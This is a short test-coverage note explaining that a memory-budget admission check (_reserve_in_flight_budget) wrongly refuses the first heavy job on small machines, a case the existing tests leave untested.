tests.description: _reserve_in_flight_budget rejects when `reserved + reservation_bytes > limit_bytes`; with an empty ledger reserved==0 this collapses to `reservation_bytes > limit_bytes` with no first-admission clamp, so on a modest machine (or with a configured per-profile LIMIT larger than available-reserve) the very first heavy job is refused with in_flight_memory_budget_exceeded — the V029 bug. The closest test, test_heavy_execution_admission_counts_in_flight_budget (test_execution_context.py:262), deliberately sets available_ram to 10 GiB so the adaptive OPTIMISER_SETUP budget fits under (10 GiB - 2 GiB reserve); it then needs a SECOND concurrent reservation to trip the cap, and explicitly asserts the FIRST succeeds. test_adaptive_default_memory_budgets_never_exceed_available_ram uses 384 MiB but calls execution_budget_for_profile (never the admission/_reserve_in_flight_budget path). So the single-heavy-job boundary is untested.
